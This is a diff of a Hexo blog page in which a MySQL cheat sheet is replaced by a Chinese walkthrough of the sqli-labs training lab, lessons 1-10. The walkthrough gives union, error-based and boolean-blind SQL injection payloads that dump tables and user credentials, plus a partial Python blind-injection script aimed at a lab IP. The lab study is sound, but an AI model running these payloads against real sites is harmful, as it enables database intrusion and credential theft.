@@ -254,7 +254,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">27</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">28</span></a>
 
   </li>
         
@@ -382,7 +382,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/常用SQL语句/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/05/sqli-labs Less 1-10/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="kawhi">
@@ -402,7 +402,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2019/03/01/常用SQL语句/" class="post-title-link" itemprop="http://yoursite.com/index.html">常用SQL语句</a>
+                <a href="/2019/03/05/sqli-labs Less 1-10/" class="post-title-link" itemprop="http://yoursite.com/index.html">sqli-labs Less 1-10</a>
               
             
           </h1>
@@ -427,7 +427,7 @@
                 
               
 
-              <time title="创建时间：2019-03-01 19:37:16" itemprop="dateCreated datePublished" datetime="2019-03-01T19:37:16+08:00">2019-03-01</time>
+              <time title="创建时间：2019-03-05 21:37:31" itemprop="dateCreated datePublished" datetime="2019-03-05T21:37:31+08:00">2019-03-05</time>
             
 
             
@@ -444,7 +444,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-03-05 15:26:48" itemprop="dateModified" datetime="2019-03-05T15:26:48+08:00">2019-03-05</time>
+                <time title="修改时间：2019-03-13 18:30:38" itemprop="dateModified" datetime="2019-03-13T18:30:38+08:00">2019-03-13</time>
               
             
           </span>
@@ -497,7 +497,211 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#MySQL</span><br><span class="line">首先得配置mysql环境（phpstudy）</span><br><span class="line">然后命令行输入SQL语句，MySQL的SQL语句以分号(;)作为结束标识</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#MySQL常用命令</span><br><span class="line">mysql -u root -p           进入mysql</span><br><span class="line">Enter password:root        默认密码为root，可以修改</span><br><span class="line"></span><br><span class="line">show databases;            显示所有的数据库</span><br><span class="line">information_schema         mysql本身架构有关数据</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line"></span><br><span class="line">use information_schema;       </span><br><span class="line">选择要操作的MySQL数据库，使用该命令后所有MySQL命令都只针对该数据库</span><br><span class="line"></span><br><span class="line">show tables;         </span><br><span class="line">显示当前数据库中的所有表，使用该命令前需要使用use命令来选择要操作的数据库</span><br><span class="line">columns         </span><br><span class="line">存储用户创建的所有数据库的库名，表名和字段名，存放字段名的字段是column_name</span><br><span class="line">schemata        </span><br><span class="line">存储用户创建的所有数据库的库名，对应的字段名为schema_name</span><br><span class="line">tables          </span><br><span class="line">存储用户创建的所有数据库的库名和表名，对应的字段名为table_schema,table_name</span><br><span class="line"></span><br><span class="line">show columns from 数据表;       </span><br><span class="line">显示数据表的属性，属性类型，主键信息是否为NULL，默认值等其他信息</span><br><span class="line"></span><br><span class="line">show index from 数据表;          </span><br><span class="line">显示数据表的详细索引信息，包括PRIMARY KEY（主键）</span><br><span class="line"></span><br><span class="line">show table status like &apos;数据表&apos;;      </span><br><span class="line">该命令将输出MySQL数据库管理系统的性能及统计信息    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#select选择语句</span><br><span class="line">select * from schemata;        选择表中的全部可用字段</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;       </span><br><span class="line">显示某一表中的某一字段</span><br><span class="line">select schema_name from schemata;     </span><br><span class="line">当选择要操作的数据库后，该语句才可以选择相应字段</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema = &apos;mysql&apos;;</span><br><span class="line">显示某一数据库中的某一表中的某一字段		</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_schema=&apos;hyb&apos; and table_name = &apos;test&apos;;         </span><br><span class="line">显示某一数据库中的某一表的某一字段的记录</span><br><span class="line"></span><br><span class="line">select * from schemata limit m,n;         </span><br><span class="line">从表中第m+1条记录开始，取n条记录</span><br><span class="line"></span><br><span class="line">select * from schemata order by schemata_name asc;       </span><br><span class="line">输出表中的数据按照某一字段升序排序（desc是降序）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#union运算符</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line">UNION中的每个SELECT语句必须具有相同的列数</span><br><span class="line">这些列也必须具有相似的数据类型</span><br><span class="line">每个SELECT语句中的列也必须以相同的顺序排列</span><br><span class="line">默认情况下，UNION运算符选择一个不同的值。如果允许重复值，使用UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#注释</span><br><span class="line">单行注释 #   或者   --空格</span><br><span class="line">多行注释 /*   */</span><br><span class="line">扩展：/*!   */</span><br><span class="line">自MySQL3.23 版以来，可在C 风格的注释中“隐藏” MySQL特有的关键字，注释以“/!*”而不是以“/*”起头。MySQL查看这种特殊类型注释的内部并使用这些关键字，但其他数据库服务器将这些关键字作为注释的一部分忽略。这样有助于编写由MySQL执行时利用MySQL特有功能的代码，而且该代码也可以不用修改就用于其他数据库服务器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#函数</span><br><span class="line">database()        查看当前网站使用的数据库</span><br><span class="line">version()         查看当前MySQL的版本</span><br><span class="line">user()            查看当前MySQL的用户</span><br><span class="line">connection_id()   查看当前服务器的连接次数</span><br><span class="line">password()        对字符串（一般来自用户的密码）进行加密</span><br><span class="line">md5()             对字符串（一般是普通的数据）进行md5加密</span><br></pre></td></tr></table></figure>
+            <h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ol>
+<li><p>靶场：<a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p>
+</li>
+<li><p>为了方便，做这些题可以利用火狐浏览器的扩展工具hackbar进行get传参</p>
+</li>
+<li><p>每道题的题目就是提示信息，告诉了我们注入类型</p>
+</li>
+<li><p>为了帮助我们理解过滤机制，可以在GitHub上下载后端源代码</p>
+</li>
+</ol>
+<h2 id="Less-1-GET-Error-based-single-quotes-String"><a href="#Less-1-GET-Error-based-single-quotes-String" class="headerlink" title="Less-1 GET-Error based-single quotes-String"></a>Less-1 GET-Error based-single quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1</span><br><span class="line">?id=1&apos;</span><br><span class="line">根据报错信息得知是单引号型注入</span><br><span class="line"></span><br><span class="line">#猜测表中字段数</span><br><span class="line">?id=1&apos; order by 1--+</span><br><span class="line">?id=1&apos; order by 2--+</span><br><span class="line">?id=1&apos; order by 3--+</span><br><span class="line">?id=1&apos; order by 4--+</span><br><span class="line">到4的时候查询错误，因此字段数为3</span><br><span class="line">每次输出一个记录，猜测内部sql语句为 select .. from .. where id=&apos;&amp;id&apos; limit 0,1;</span><br><span class="line"></span><br><span class="line">#确定字段的显示顺序</span><br><span class="line">?id=0&apos; union select 1,2,3--+</span><br><span class="line">根据访问结果可知2，3两个字段会显示</span><br><span class="line">该语句也可以判断表中的字段数</span><br><span class="line"></span><br><span class="line">#暴库（注意：id=非正确值）</span><br><span class="line">?id=0&apos; union select 1,2,database()--+</span><br><span class="line">得到库名&apos;security&apos;</span><br><span class="line"></span><br><span class="line">#暴表</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">暴出表名 emails,referers,uagents,users，猜测users是用户数据表</span><br><span class="line"></span><br><span class="line">#暴字段</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line">得到表中字段有 id,username,password。</span><br><span class="line"></span><br><span class="line">#暴数据</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(username,&apos; &apos;,password) from users--+</span><br></pre></td></tr></table></figure>
+<p>Question：为什么在暴库时id必须是非正确值？    </p>
+<p>Answer：因为在猜测表中字段数时发现客户端每次返回一条记录，所以在使用union子句查询时如果id为正确值，那么客户端就会返回正确值的记录。只有在id为非正确值时才会返回union子句的查询结果，从而暴出库名。</p>
+<h2 id="Less-2-GET-Error-Based-Intiger-based"><a href="#Less-2-GET-Error-Based-Intiger-based" class="headerlink" title="Less-2 GET-Error Based-Intiger based"></a>Less-2 GET-Error Based-Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1 and 1=1          查询成功</span><br><span class="line">?id=1 and 1=2          查询失败</span><br><span class="line">判断可知是数字型注入，剩余步骤同Less-1，只是不加单引号</span><br></pre></td></tr></table></figure>
+<h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="Less-3 GET-Error based-Single quotes with twist-string"></a>Less-3 GET-Error based-Single quotes with twist-string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1       查询成功</span><br><span class="line">?id=1&apos;      查询失败：&apos;&apos;1&apos;&apos;) LIMIT 0,1&apos;</span><br><span class="line">根据报错信息可以猜测内部sql查询语句为 select .. from .. where id=(&apos;&amp;id&apos;) limit 0,1;</span><br><span class="line">因此在输入的id后加上单引号和右括号，其他同Less-1</span><br><span class="line">例如：?id=1&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-4-GET-Error-Based-Double-quotes-String"><a href="#Less-4-GET-Error-Based-Double-quotes-String" class="headerlink" title="Less-4 GET-Error Based-Double quotes-String"></a>Less-4 GET-Error Based-Double quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1        查询成功</span><br><span class="line">?id=1&apos;       查询成功</span><br><span class="line">?id=1&quot;       查询失败：&apos;&quot;1&quot;&quot;) LIMIT 0,1&apos;</span><br><span class="line">根据报错信息可以猜测内部sql查询语句为 select .. from .. where id=(&quot;$id&quot;) limit 0,1;</span><br><span class="line">因此在输入的id后加上双引号和右括号，其他同Less-1</span><br><span class="line">例如：?id=1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 GET-Double Injection-Single Quotes-String"></a>Less-5 GET-Double Injection-Single Quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1        You are in ...</span><br><span class="line">?id=1&apos;       错误信息：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos;</span><br><span class="line">判断是单引号型注入，但采用常规的union注入发现不管用，因此想到报错注入，这题利用的是floor()报错注入</span><br><span class="line"></span><br><span class="line">#猜测表中字段数，确定字段显示顺序（方法同Less-1）</span><br><span class="line"></span><br><span class="line">#暴库</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select database()),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">输出信息：Duplicate entry &apos;security 1&apos; for key &apos;group_key&apos;</span><br><span class="line"></span><br><span class="line">#暴表（之后的操作只要修改子查询语句即可）</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos;),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">错误信息：Subquery returns more than 1 row（子查询返回多于一行）</span><br><span class="line">因此，添加limit子句来限制单行输出记录</span><br><span class="line"></span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 4,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">当limit 4,1 时就没有表暴出。共暴出emails,referers,uagents,users四个表</span><br><span class="line"></span><br><span class="line">#暴字段</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 3,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">共暴出id,password,username三个字段</span><br><span class="line"></span><br><span class="line">#暴数据</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select concat(username, &apos; &apos;,password) from users limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">依次修改limit子句就可以暴出所有数据</span><br></pre></td></tr></table></figure>
+<p>关于floor()报错注入，这里有两篇比较好的博客：<br><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect</a><br><a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-27209-1-43.html</a></p>
+<h2 id="Less-6-GET-Double-Injection-Double-Quotes-String"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6 GET-Double Injection-Double Quotes-String"></a>Less-6 GET-Double Injection-Double Quotes-String</h2><p>这题是双引号型注入，其他和Less-5一样   </p>
+<h2 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7 GET-Dump into outfile-String"></a>Less-7 GET-Dump into outfile-String</h2><h2 id="Less-8-GET-Blind-Boolian-Based-Singles-Quotes"><a href="#Less-8-GET-Blind-Boolian-Based-Singles-Quotes" class="headerlink" title="Less-8 GET-Blind-Boolian Based-Singles Quotes"></a>Less-8 GET-Blind-Boolian Based-Singles Quotes</h2><ol>
+<li><p>布尔型盲注原理：<br>布尔型盲注即在sql注入过程中，应用程序仅返回true页面和false页面，这时我们无法根据返回页面得到我们需要的数据库信息。但是我们可以构造逻辑判断（比较大小）来一步步脱库。</p>
+</li>
+<li><p>方法：手工注入或者脚本注入，核心思想都是二分法。   </p>
+</li>
+</ol>
+<h3 id="方法一：手工注入"><a href="#方法一：手工注入" class="headerlink" title="方法一：手工注入"></a>方法一：手工注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#判断数据库名长度</span><br><span class="line">?id=1&apos; and length(database())=8--+</span><br><span class="line"></span><br><span class="line">#判断数据库名</span><br><span class="line">?id=1&apos; and left((select database()),1)&lt;&apos;t&apos;--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select database()),1)=&apos;s&apos;--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select database()),8)=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">#判断数据库中表名</span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&apos;r&apos; --+</span><br><span class="line"></span><br><span class="line">#判断表中字段名</span><br><span class="line">?id=1&apos; and left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),8)=&apos;password&apos; --+</span><br><span class="line"></span><br><span class="line">#获取数据</span><br><span class="line">?id=1&apos; and left((select password from users order by id limit 0,1),1)=&apos;d&apos; --+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select username from users order by id limit 0,1),1)=&apos;d&apos; --+</span><br></pre></td></tr></table></figure>
+<h3 id="方法二：脚本注入"><a href="#方法二：脚本注入" class="headerlink" title="方法二：脚本注入"></a>方法二：脚本注入</h3><p>由于水平有限脚本没有优化，但还是可以脱库的。另外，由于脱库过程需要一步步进行，所以后面的函数基于前面函数执行获取的数据信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and length(database())&gt;%s"</span> %i</span><br><span class="line">		<span class="comment"># print(url+payload+'%23')</span></span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print('false')</span></span><br><span class="line">			print(<span class="string">'database_length:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr(database(),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			<span class="comment"># print(url+'%23')</span></span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'database_name:'</span>,name)		</span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;%s"</span> %i</span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'table_number:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">table_num()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'table_name:'</span>,name)</span><br><span class="line">table_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and (select count(column_name) from information_schema.columns where table_name='users')&gt;%s"</span> %i</span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'column_number:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">column_num()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				